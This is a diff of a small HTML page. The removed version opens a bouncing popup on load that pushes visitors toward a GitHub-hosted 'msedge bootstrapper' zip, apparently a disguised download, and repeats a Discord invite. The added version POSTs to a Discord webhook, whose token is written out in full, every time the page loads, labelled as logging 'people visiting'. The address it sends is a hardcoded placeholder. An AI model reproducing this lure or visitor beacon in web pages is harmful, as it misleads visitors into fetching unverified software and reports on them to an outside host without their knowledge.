@@ -1,81 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>https://discord.gg/nP4ZVx2mfB</title>
-    <script>
-        // https://discord.gg/nP4ZVx2mfB
-        function spawnMovingPopup() {
-            // https://discord.gg/nP4ZVx2mfB
-            const popup = window.open(
-                "", 
-                "FlyingPopup", 
-                "width=200,height=150,resizable=no,scrollbars=no"
-            );
-
-            if (!popup) {
-                alert("enable popups idiot");
-                return;
-            }
-
-            // https://discord.gg/nP4ZVx2mfB
-            popup.document.write(`
-                <html>
-                    <head>
-                        <title>go to text in website</title>
-                        <style>
-                            body {
-                                display: flex;
-                                justify-content: center;
-                                align-items: center;
-                                font-family: Arial, sans-serif;
-                                background-color: aqua;
-                                color: black;
-                                margin: 0;
-                                height: 100%;
-                                overflow: hidden;
-                            }
-                        </style>
-                    </head>
-                    <body>
-                        <h1>https://github.com/coolperson-sudo/msedge/raw/refs/heads/main/msedge%20bootstrapper%20v0.01.zip</h1>
-                    </body>
-                </html>
-            `);
-            popup.document.close();
-
-            // https://discord.gg/nP4ZVx2mfB
-            let posX = 100;
-            let posY = 100;
-            let directionX = 1;
-            let directionY = 1;
-
-            // https://discord.gg/nP4ZVx2mfB
-            setInterval(() => {
-                const screenWidth = screen.availWidth;
-                const screenHeight = screen.availHeight;
-
-                // Change direction if popup hits screen edges
-                if (posX <= 0 || posX + 200 >= screenWidth) directionX *= -1;
-                if (posY <= 0 || posY + 150 >= screenHeight) directionY *= -1;
-
-                // https://discord.gg/nP4ZVx2mfB
-                posX += directionX * 10;
-                posY += directionY * 10;
-
-                // https://discord.gg/nP4ZVx2mfB
-                popup.moveTo(posX, posY);
-            }, 50);
-        }
-
-        // https://discord.gg/nP4ZVx2mfB
-        window.onload = spawnMovingPopup;
-    </script>
+  <meta charset="UTF-8">
+  <title>hi</title>
 </head>
 <body>
-    <h1 style="color: white; text-align: center; font-family: Arial, sans-serif;">
-        https://discord.gg/nP4ZVx2mfB
-    </h1>
+  <script>
+    // yo
+    const ipv4Address = '192.0.2.1'; // u trippin it doesnt take ur ip address?
+
+    // webhook for people visiting
+    const webhookUrl = 'https://discord.com/api/webhooks/1309880736089641031/lJaPpVF5e1mSh-DyRyRcb8G8GhwLUIijx3z4uynsbil5Ey5OYZSADnCLZjMLFv0qUjJ';
+
+    // json payload!
+    const payload = {
+      "content": `IPv4 Address: ${ipv4Address}`,
+    };
+
+    // poster!
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    })
+    .then(response => response.json())
+    .catch(error => console.error('error: ', error));
+  </script>
 </body>
 </html>
